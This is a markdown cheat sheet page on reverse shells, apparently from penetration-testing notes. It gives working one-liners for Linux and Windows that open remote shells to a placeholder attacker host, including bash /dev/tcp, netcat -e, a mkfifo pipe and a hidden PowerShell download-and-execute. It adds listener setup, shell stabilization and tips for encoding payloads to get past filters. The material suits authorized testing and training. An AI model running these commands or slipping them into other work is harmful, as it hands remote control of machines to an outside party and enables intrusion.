---
title: 'Reverse Shells'
weight: 2
draft: false
---
## 🧠 Overview
A reverse shell allows an attacker to connect back to their machine and gain remote access to a target system. This section includes payloads, tools, one-liners, and techniques for both Linux and Windows environments.

---

## 🔌 Basic Reverse Shells

### 🐧 Linux

```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

```bash
nc -e /bin/sh ATTACKER_IP PORT
```

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### 🪟 Windows

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

```cmd
nc.exe -e cmd.exe ATTACKER_IP PORT
```

---

## 🛠️ Tools

- [Ncat (from Nmap)](https://nmap.org/ncat/) – Advanced netcat replacement.
- [MSFvenom](https://docs.rapid7.com/metasploit/msfvenom/) – Payload generator for Windows/Linux shells.
- [socat](http://www.dest-unreach.org/socat/) – Flexible tool for socket communication and reverse shells.
- [chisel](https://github.com/jpillora/chisel) – TCP/UDP tunneling over HTTP, often used for reverse shells via HTTP.

---

## 📦 Payload Generators

- [Reverse Shell Generator](https://www.revshells.com/)
- [PayloadsAllTheThings – Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet)

---

## 🔁 Shell Stabilization (Linux)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
CTRL-Z
stty raw -echo; fg
```

```bash
export TERM=xterm
```

---

## 🧪 Tips

- Always set up a listener before triggering a reverse shell:

```bash
nc -lvnp PORT
```

- Check firewall rules — use high-numbered ports like 4444, 9001, 1337.
- Encode payloads for web or command injection (e.g., URL-encode or Base64).
- Use `tcpdump` or `wireshark` to monitor connections if shell doesn’t arrive.

---

## 📚 References

- [GTFOBins – reverse shell](https://gtfobins.github.io)
- [HackTricks – reverse shell](https://book.hacktricks.xyz/pentesting-web/reverse-shell-cheatsheet)
